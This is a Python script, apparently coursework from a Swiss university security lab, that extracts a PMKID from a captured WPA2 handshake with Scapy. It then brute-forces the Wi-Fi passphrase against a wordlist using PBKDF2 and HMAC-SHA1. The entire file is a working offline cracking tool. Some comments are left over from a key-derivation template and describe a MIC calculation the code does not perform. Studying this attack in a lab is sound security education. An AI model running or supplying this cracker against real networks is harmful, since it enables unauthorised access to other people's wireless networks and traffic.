#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex, hexlify
from pbkdf2 import PBKDF2
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap") 

# Important parameters for key derivation - most of them can be obtained from the pcap file
ssid        = "Sunrise_2.4GHz_DD4B90"
APmac       = ""
Clientmac   = ""
PMKID = ""

# Iterate over each packet
for pkt in wpa:
    # Check if we have a 802.11 packet and haven't found the WiFi mac yet
    if pkt.haslayer(Dot11) and APmac == "":
        try:
            # Check if the packet contains the right ssid 
            if pkt.info.decode('ascii') == ssid:
                #Register the mac of the ap
                APmac = pkt[Dot11].addr2.replace(":", "")
                print("Found SSID MAC", APmac)
        except Exception:
            pass
    
    # Check foe EAPOL packet
    if pkt.haslayer(EAPOL):
        src = pkt[Dot11].addr2.replace(":", "")
        dst = pkt[Dot11].addr1.replace(":", "")
        to_DS = pkt[Dot11].FCfield & 0x1 !=0
        from_DS = pkt[Dot11].FCfield & 0x2 !=0

        # If the packet id from DS
        if from_DS == True and src == APmac:
            nonce = hexlify(pkt[Raw].load)[26:90]
            mic = hexlify(pkt[Raw].load)[154:186]
            
            # Check for the PMKID
            pmkid = hexlify(pkt.getlayer(Raw).load)[202:234]
            if pmkid != '00000000000000000000000000000000' and pmkid != '':
                Clientmac = dst
                PMKID = pmkid.decode('utf-8')
                print("Extracted PMKID", PMKID)
                break

# Load the wordlist and iterate over it
with open("wordlist.txt") as f:
    while(True):
        passPhrase  = f.readline().replace("\n", "")

        if passPhrase == "":
            break

        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        passPhrase = str.encode(passPhrase)
        
        pmk = PBKDF2(passPhrase,ssid.encode(), 4096).read(32)

        #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
        hashed = hmac.new(pmk, b"PMK Name" + a2b_hex(APmac) + a2b_hex(Clientmac), hashlib.sha1).hexdigest()

        print ("\nResults of the key expansion")
        print ("=============================")
        print ("Passphrase: ",passPhrase,"\n")
        print ("PMK:\t\t", pmk.hex(),"\n")
        print ("PMKID:\t\t",PMKID,"\n")
        print ("Calc PMKID:\t",hashed[:32],"\n")

        # Check if the calculated mic is the same as the mic
        if PMKID == hashed[:32]:
            print("Found Passphrase: ", passPhrase.decode())
            exit(0)

print("Could not find passphrase")